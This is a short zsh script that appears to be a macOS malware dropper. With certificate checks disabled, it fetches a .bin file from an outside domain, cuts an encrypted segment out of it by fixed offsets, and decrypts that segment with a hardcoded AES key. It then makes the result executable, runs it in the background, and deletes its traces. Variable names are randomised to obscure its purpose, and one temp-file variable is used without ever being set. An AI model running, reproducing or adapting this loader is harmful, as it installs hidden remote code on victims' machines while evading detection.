#!/bin/zsh
puk4f=$(mktemp /tmp/8vwqhz.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m29a3739f7f1e5e05.bin" -o "$puk4fz" || exit 1
ytvqr3=$(stat -f %z "$puk4fz"); s673v6p=$(( ytvqr3 - 2672 - 1616 ))
tail -c +$(( 2672 + 1 )) "$puk4fz" | head -c $s673v6p | openssl enc -d -aes-256-cbc -k 3b2fb314b3f7c9c17322ca64 -out "$puk4f" 2>/dev/null
[ -s "$puk4f" ] && chmod 700 "$puk4f" && ( "$puk4f" & ) && disown
( sleep 3; rm -f "$puk4f" "$puk4fz" ) &>/dev/null &
